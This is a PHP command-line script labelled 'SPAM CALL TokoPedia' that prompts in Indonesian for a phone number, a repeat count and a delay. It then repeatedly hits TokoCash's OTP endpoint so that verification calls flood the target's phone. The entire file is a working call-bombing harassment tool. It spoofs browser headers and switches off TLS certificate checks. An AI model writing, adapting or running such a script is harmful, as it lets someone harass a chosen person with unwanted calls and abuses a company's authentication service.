<?php
$nohp = $_POST['nohp'];
$jumlah = $_POST['jumlah'];
$delay = $_POST['delay'];
function tokcall($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://www.tokocash.com/oauth/otp");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"msisdn=".$no."&accept=call");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.tokocash.com/oauth/otp');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
print "\n\nSPAM CALL TokoPedia\n";
print "Limit 3/jam\n";
print "Koe Nurf\n\n\n";
echo "Nomor (eg : 628xxx)\nInput : ";
$nomor = trim(fgets(STDIN));
echo "Jumlah \nInput : ";
$jumlah = trim(fgets(STDIN));
echo "Jeda (detik)\nInput : ";
$delay = trim(fgets(STDIN));
$execute = tokcall($nomor, $jumlah, $delay);
print $execute;
?>
